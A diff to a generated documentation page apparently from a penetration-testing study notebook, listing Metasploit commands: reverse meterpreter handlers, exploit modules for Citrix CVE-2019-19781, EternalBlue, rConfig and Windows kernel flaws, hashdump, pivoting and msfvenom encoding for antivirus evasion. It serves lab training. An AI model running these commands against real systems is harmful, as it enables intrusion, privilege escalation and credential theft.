@@ -9,6 +9,111 @@ hideFooterPagination: true
 
 {/* Generated from Commands/metasploit.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## msfconsole: choose the operation and read the result
+
+Open Metasploit and configure a module.
+
+### What the result establishes
+
+Read module information, required options and check behavior, then verify the resulting session type and identity.
+
+### Prerequisites and common failures
+
+An exploit's name or a matching banner is insufficient; target build, module prerequisites, payload compatibility and network direction matter.
+
+### Example 1: Commands
+
+Run in: **Kali / msfconsole**. The handler must exactly match the payload and callback address/port you generated.
+
+```bash
+msfconsole -q
+# Inside msfconsole
+search smb
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST KALI_IP
+set LPORT 4444
+run
+```
+
+### Example 2: Resource scripts & automation
+
+Run in: **Saved lab example**.
+
+```bash
+msf6 > makerc setup.rc          # save your typed commands to a script
+msfconsole -q -r setup.rc       # replay them on launch (set options, start handler)
+```
+
+Saved context: [Metasploit Framework: Startup to Sessions — Resource scripts & automation](/exploitation/metasploit-framework-cheat-sheet#resource-scripts-&-automation). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Starting up & the database
+
+Run in: **Saved lab example**.
+
+```bash
+sudo msfdb init        # set up the PostgreSQL database (once)
+msfconsole -q          # launch the console (-q = no banner)
+msf6 > db_status       # confirm DB connected
+msf6 > workspace -a engagement1   # separate workspaces per engagement
+```
+
+Saved context: [Metasploit Framework: Startup to Sessions — Starting up & the database](/exploitation/metasploit-framework-cheat-sheet#starting-up-&-the-database). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Reconnaissance & footprinting
+
+Run in: **Saved lab example**.
+
+```bash
+msfconsole
+use auxiliary/scanner/ipmi/ipmi_version
+set RHOSTS <TARGET-IP>
+run
+```
+
+Saved context: [IPMI and BMC Enumeration — Reconnaissance & footprinting](/enumeration/ipmi-intelligent-platform-management-interface-penetration-testing-cheat-sheet#reconnaissance-&-footprinting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7
+
+Run in: **Saved lab example**.
+
+```powershell
+https://www.exploit-db.com/exploits/11199
+
+Metasploit : exploit/windows/local/ms10_015_kitrap0d
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7](/privesc/windows-privesc-checklist#ms10-015-kitrap0d-microsoft-windows-nt/2000/2003/2008/xp/vista/7). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: MS11-080 (afd.sys) - Microsoft Windows XP/2003
+
+Run in: **Saved lab example**.
+
+```powershell
+Python: https://www.exploit-db.com/exploits/18176
+Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — MS11-080 (afd.sys) - Microsoft Windows XP/2003](/privesc/windows-privesc-checklist#ms11-080-afd-sys-microsoft-windows-xp/2003). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Exploit it
+
+Run in: **Saved lab example**.
+
+```bash
+msfconsole -q
+use exploit/linux/http/citrix_dir_traversal_rce
+set RHOSTS <TARGET>
+set LHOST <YOUR_VPN_IP>
+run
+```
+
+Saved context: [Citrix NetScaler: CVE-2019-19781 Reference — Exploit it](/enumeration/citrix-netscaler#exploit-it). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Open Metasploit and configure a module.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=metasploit) · [All tools](/index)
@@ -52,6 +157,13 @@ set LHOST <YOUR_VPN_IP>
 run
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Exploit it](/enumeration/citrix-netscaler#exploit-it)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Reconnaissance &amp; footprinting">
@@ -66,6 +178,13 @@ use auxiliary/scanner/ipmi/ipmi_version
 set RHOSTS <TARGET-IP>
 run
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IPMI and BMC Enumeration — Reconnaissance & footprinting](/enumeration/ipmi-intelligent-platform-management-interface-penetration-testing-cheat-sheet#reconnaissance-&-footprinting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -83,6 +202,13 @@ set RHOSTS <TARGET-IP>
 # set PASS_FILE /path/to/wordlist.txt # optional: module will also try cracking inline
 run
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IPMI and BMC Enumeration — Step 2: Dump the hashes (the RAKP flaw in action)](/enumeration/ipmi-intelligent-platform-management-interface-penetration-testing-cheat-sheet#step-2-dump-the-hashes-the-rakp-flaw-in-action)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -106,6 +232,13 @@ msf6 exploit(...) > check                    # (if supported) test vuln without 
 msf6 exploit(...) > run                       # or 'exploit'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Core workflow — search → use → set → run](/exploitation/metasploit-framework-cheat-sheet#core-workflow-—-search-→-use-→-set-→-run)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Metasploit Framework: Startup to Sessions**
 
 Context from the notebook: search  filters:  search cve:2021 type:exploit platform:windows name:exchange . Then  use 0  to select by result number.
@@ -113,6 +246,13 @@ Context from the notebook: search  filters:  search cve:2021 type:exploit platfo
 ```text
 search cve:2021 type:exploit platform:windows name:exchange
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Core workflow — search → use → set → run](/exploitation/metasploit-framework-cheat-sheet#core-workflow-—-search-→-use-→-set-→-run)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -130,6 +270,13 @@ In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
 Need the internal net? → autoroute + socks_proxy → proxychains everything else
 Always: LHOST = your tun0, payload in venom must match the handler
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Mental model](/exploitation/metasploit-framework-cheat-sheet#mental-model)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -153,6 +300,13 @@ meterpreter > getsystem               # attempt local privesc to SYSTEM
 meterpreter > background              # park the session (back to msf prompt)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Meterpreter — the premium payload](/exploitation/metasploit-framework-cheat-sheet#meterpreter-—-the-premium-payload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Metasploit Framework: Startup to Sessions**
 
 Context from the notebook: migrate  into a stable process (e.g.  explorer.exe  or  lsass  if SYSTEM) so your session survives if the exploited process dies — and to match the privilege/arch you need.
@@ -160,6 +314,13 @@ Context from the notebook: migrate  into a stable process (e.g.  explorer.exe  o
 ```text
 explorer.exe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Meterpreter — the premium payload](/exploitation/metasploit-framework-cheat-sheet#meterpreter-—-the-premium-payload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -173,6 +334,13 @@ explorer.exe
 windows/x64/meterpreter/reverse_tcp    ← staged   ( / before reverse_tcp)
 windows/x64/meterpreter_reverse_tcp    ← stageless ( _ )
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Payloads — staged vs stageless (the / vs _)](/exploitation/metasploit-framework-cheat-sheet#payloads-—-staged-vs-stageless-the-/-vs-_)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -192,6 +360,13 @@ meterpreter > run autoroute -s 172.16.5.0/24
 msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools through it
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Post-exploitation & pivoting](/exploitation/metasploit-framework-cheat-sheet#post-exploitation-&-pivoting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Resource scripts &amp; automation">
@@ -204,6 +379,13 @@ msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools th
 msf6 > makerc setup.rc          # save your typed commands to a script
 msfconsole -q -r setup.rc       # replay them on launch (set options, start handler)
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Resource scripts & automation](/exploitation/metasploit-framework-cheat-sheet#resource-scripts-&-automation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -220,6 +402,13 @@ meterpreter > background        # or Ctrl-Z — park it
 msf6 > sessions -u 1            # upgrade a basic shell → Meterpreter
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Sessions & the multi/handler](/exploitation/metasploit-framework-cheat-sheet#sessions-&-the-multi/handler)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Metasploit Framework: Startup to Sessions**
 
 ```bash
@@ -229,6 +418,13 @@ msf6 > set LHOST tun0
 msf6 > set LPORT 4444
 msf6 > run -j           # -j = run as background job (keeps listening)
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Sessions & the multi/handler](/exploitation/metasploit-framework-cheat-sheet#sessions-&-the-multi/handler)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -245,6 +441,13 @@ msf6 > db_status       # confirm DB connected
 msf6 > workspace -a engagement1   # separate workspaces per engagement
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Starting up & the database](/exploitation/metasploit-framework-cheat-sheet#starting-up-&-the-database)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Metasploit Framework: Startup to Sessions**
 
 Context from the notebook: The DB lets you  db_import scan.xml  (an Nmap  -oX  file), then  hosts  and  services  recall everything — and modules can auto-target  RHOSTS  from it.
@@ -252,6 +455,13 @@ Context from the notebook: The DB lets you  db_import scan.xml  (an Nmap  -oX  f
 ```text
 db_import scan.xml
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Starting up & the database](/exploitation/metasploit-framework-cheat-sheet#starting-up-&-the-database)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -276,6 +486,13 @@ msfvenom --list formats
 msfvenom --list payloads | grep windows
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Metasploit Framework: Startup to Sessions**
 
 Context from the notebook: -e &lt;encoder> -i &lt;count>  to encode (e.g.  -e x86/shikata_ga_nai -i 3 ) — modest AV evasion / bad-char removal, not a real bypass anymore.
@@ -283,6 +500,13 @@ Context from the notebook: -e &lt;encoder> -i &lt;count>  to encode (e.g.  -e x8
 ```text
 -e <encoder> -i <count>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Metasploit Framework: Startup to Sessions**
 
@@ -292,6 +516,13 @@ Context from the notebook: -e &lt;encoder> -i &lt;count>  to encode (e.g.  -e x8
 -e x86/shikata_ga_nai -i 3
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Metasploit Framework: Startup to Sessions**
 
 Context from the notebook: -b '\x00'  to avoid bad characters (e.g. null bytes in buffer-overflow contexts).
@@ -299,6 +530,13 @@ Context from the notebook: -b '\x00'  to avoid bad characters (e.g. null bytes i
 ```text
 -b '\x00'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -319,6 +557,13 @@ set RHOSTS <IP>
 run
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Footprinting & scanning](/enumeration/mssql-microsoft-sql-server-cheat-sheet#footprinting-&-scanning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Output formats (always save your scans)">
@@ -333,6 +578,13 @@ nmap -oG scan.grep <target>        # greppable (easy to awk/grep)
 nmap -oX scan.xml <target>         # XML (feeds other tools, e.g. metasploit db_import)
 nmap -oA scan <target>             # all three at once (scan.nmap/.gnmap/.xml)
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Nmap: Host Discovery, Scanning, and Output — Output formats (always save your scans)](/recon/network-enumeration-with-nmap-cheat-sheet#output-formats-always-save-your-scans)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -351,6 +603,13 @@ set rhosts 10.129.42.197
 run
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — SMB (445)](/password-attacks/password-attacks-cheat-sheet#smb-445)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2 · Metasploit routing (pivot through a session)">
@@ -368,6 +627,13 @@ route print                             # verify
 use auxiliary/server/socks_proxy        # SRVPORT 9050, VERSION 5, run -j
 # then proxychains (socks5 127.0.0.1 9050) your nmap/xfreerdp/etc.
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — 2 · Metasploit routing (pivot through a session)](/modules/pivoting-tunneling-port-forwarding#2-·-metasploit-routing-pivot-through-a-session)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -390,6 +656,13 @@ msf6 > set LHOST <your_ip>
 msf6 > exploit
 # → NT AUTHORITY\SYSTEM
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — EternalBlue (MS17-010) Exploitation](/exploitation/shells-payloads-cheat-sheet#eternalblue-ms17-010-exploitation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -430,6 +703,13 @@ meterpreter > upload <file>   # Upload file
 meterpreter > download <file> # Download file
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Metasploit Basic Workflow](/exploitation/shells-payloads-cheat-sheet#metasploit-basic-workflow)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Module Naming Convention">
@@ -445,6 +725,13 @@ exploit/windows/smb/psexec
   │        └── Platform
   └── Module type
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Module Naming Convention](/exploitation/shells-payloads-cheat-sheet#module-naming-convention)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -462,6 +749,13 @@ msf6 > exploit
 # → Meterpreter session as apache user
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — rConfig 3.9.6 Exploitation](/exploitation/shells-payloads-cheat-sheet#rconfig-3-9-6-exploitation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MS08-067 (NetAPI)">
@@ -473,6 +767,13 @@ msf6 > exploit
 ```powershell
 exploit/windows/smb/ms08_067_netapi
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS08-067 (NetAPI)](/privesc/windows-privesc-checklist#ms08-067-netapi)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -488,6 +789,13 @@ https://www.exploit-db.com/exploits/11199
 Metasploit : exploit/windows/local/ms10_015_kitrap0d
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7](/privesc/windows-privesc-checklist#ms10-015-kitrap0d-microsoft-windows-nt/2000/2003/2008/xp/vista/7)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MS11-080 (afd.sys) - Microsoft Windows XP/2003">
@@ -500,6 +808,13 @@ Metasploit : exploit/windows/local/ms10_015_kitrap0d
 Python: https://www.exploit-db.com/exploits/18176
 Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS11-080 (afd.sys) - Microsoft Windows XP/2003](/privesc/windows-privesc-checklist#ms11-080-afd-sys-microsoft-windows-xp/2003)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -523,6 +838,13 @@ https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 use exploit/windows/local/ms15_051_client_copy_image
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012](/privesc/windows-privesc-checklist#ms15-051-client-copy-image-microsoft-windows-2003/2008/7/8/2012)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MS16-032 - Microsoft Windows 7  10 / 2008  2012 R2 (x86/x64)">
@@ -541,6 +863,13 @@ Binary exe : https://github.com/Meatballs1/ms16-032
 Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)](/privesc/windows-privesc-checklist#ms16-032-microsoft-windows-7-<-10-/-2008-<-2012-r2-x86/x64)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MS17-010 (Eternal Blue)">
@@ -557,6 +886,13 @@ exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Wi
 exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS17-010 (Eternal Blue)](/privesc/windows-privesc-checklist#ms17-010-eternal-blue)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="⏱️ DECISION HEADER — &quot;I need to… → do…&quot;">
@@ -570,6 +906,13 @@ Context from the notebook: Let  external tools  use MSF's routes socks_proxy  mo
 ```text
 use auxiliary/server/socks_proxy
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — ⏱️ DECISION HEADER — "I need to… → do…"](/modules/pivoting-tunneling-port-forwarding#-decision-header-—-i-need-to…-→-do…)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -593,6 +936,21 @@ LPORT => 8080
 [*] Started reverse TCP handler on 172.16.5.225:8080
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Configuring & Starting MSF multi/handler](/active-directory/historical-vulnerability-labs#configuring-&-starting-msf-multi/handler)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Metasploit Framework: Startup to Sessions](/exploitation/metasploit-framework-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
